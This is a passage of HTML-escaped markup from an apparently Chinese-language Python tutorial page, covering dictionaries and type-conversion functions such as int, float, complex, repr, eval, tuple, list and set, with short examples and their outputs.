&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;Dictionary-字典&#34;&gt;&lt;a href=&#34;#Dictionary-字典&#34; class=&#34;headerlink&#34; title=&#34;Dictionary(字典)&#34;&gt;&lt;/a&gt;Dictionary(字典)&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;字典是无序的，依靠键值对来存取&lt;/li&gt;
&lt;li&gt;字典用&lt;code&gt;{}&lt;/code&gt;标识， &lt;code&gt;键(key) : 值(value)&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;key&lt;/code&gt;不可变，并且是唯一的&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;{}&lt;/code&gt;创建空字典&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;创建字典&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 空字典&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {2: &#39;test&#39;, &#39;test&#39;: 1}&lt;/span&gt;
dict2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;dddd&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# {&#39;test&#39;: 1, 1: &#39;dddd&#39;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出2,test的值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;keys&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有键名&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# dict_keys([&#39;test&#39;, 1])&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dict2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;values&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 输出所有键值&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# dict_values([1, &#39;dddd&#39;])&lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
{2: &#39;test&#39;, &#39;test&#39;: 1}
{&#39;test&#39;: 1, 1: &#39;dddd&#39;}
test 1
dict_keys([&#39;test&#39;, 1])
dict_values([1, &#39;dddd&#39;])
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数据类型转换&#34;&gt;&lt;a href=&#34;#数据类型转换&#34; class=&#34;headerlink&#34; title=&#34;数据类型转换&#34;&gt;&lt;/a&gt;数据类型转换&lt;/h3&gt;&lt;h5 id=&#34;class-int-x-base-10&#34;&gt;&lt;a href=&#34;#class-int-x-base-10&#34; class=&#34;headerlink&#34; title=&#34;class int(x, base=10)&#34;&gt;&lt;/a&gt;&lt;code&gt;class int(x, base=10)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# x为数值型时,不写base,直接取整,x为str时,base为转换前的进制&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3.6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
3
-11
18
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-float-x&#34;&gt;&lt;a href=&#34;#class-float-x&#34; class=&#34;headerlink&#34; title=&#34;class float([x])&#34;&gt;&lt;/a&gt;&lt;code&gt;class float([x])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将整数和字符串转换成浮点数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1.0
-11.2
12.0
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-complex-real-imag&#34;&gt;&lt;a href=&#34;#class-complex-real-imag&#34; class=&#34;headerlink&#34; title=&#34;class complex([real[, imag]])&#34;&gt;&lt;/a&gt;&lt;code&gt;class complex([real[, imag]])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建一个复数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1+3j&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
(1+0j)
(1+2j)
(1+3j)
(1+2j)
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-str-object&#34;&gt;&lt;a href=&#34;#class-str-object&#34; class=&#34;headerlink&#34; title=&#34;class str(object=&#39;&#39;)&#34;&gt;&lt;/a&gt;&lt;code&gt;class str(object=&#39;&#39;)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将对象转化为适于人阅读的形式&lt;/span&gt;
s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# test&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;repr-object&#34;&gt;&lt;a href=&#34;#repr-object&#34; class=&#34;headerlink&#34; title=&#34;repr(object)&#34;&gt;&lt;/a&gt;&lt;code&gt;repr(object)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将对象转化为供解释器读取的形式&lt;/span&gt;

dad &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;repr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;dad&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
&#39;test&#39;
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;eval-expression-globals-locals&#34;&gt;&lt;a href=&#34;#eval-expression-globals-locals&#34; class=&#34;headerlink&#34; title=&#34;eval(expression[, globals[, locals]])&#34;&gt;&lt;/a&gt;&lt;code&gt;eval(expression[, globals[, locals]])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 用来执行一个字符串表达式，并返回表达式的值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;pow(2,2)&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;eval&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;2 * 2&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
4
4
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;tuple-iterable&#34;&gt;&lt;a href=&#34;#tuple-iterable&#34; class=&#34;headerlink&#34; title=&#34;tuple( iterable )&#34;&gt;&lt;/a&gt;&lt;code&gt;tuple( iterable )&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将可迭代系列（如列表）转换为元组&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# tuple() 可以将字符串，列表，字典，集合转化为元组&lt;/span&gt;
list1&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;34&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;56&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;78&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;tuple&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token comment&#34;&gt;# (&#39;12&#39;, &#39;34&#39;, &#39;56&#39;, &#39;78&#39;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;list-seq&#34;&gt;&lt;a href=&#34;#list-seq&#34; class=&#34;headerlink&#34; title=&#34;list( seq )&#34;&gt;&lt;/a&gt;&lt;code&gt;list( seq )&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 用于将元组或字符串转换为列表&lt;/span&gt;
aTuple &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;123&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Google&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Runoob&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;Taobao&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
list1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;aTuple&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表元素 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [123, &#39;Google&#39;, &#39;Runoob&#39;, &#39;Taobao&#39;]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34;Hello World&#34;&lt;/span&gt;
list2&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;str&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;列表元素 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 列表元素 :  [&#39;H&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39; &#39;, &#39;W&#39;, &#39;o&#39;, &#39;r&#39;, &#39;l&#39;, &#39;d&#39;]&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-set-iterable&#34;&gt;&lt;a href=&#34;#class-set-iterable&#34; class=&#34;headerlink&#34; title=&#34;class set([iterable])&#34;&gt;&lt;/a&gt;&lt;code&gt;class set([iterable])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# set() 函数创建一个无序不重复元素集&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

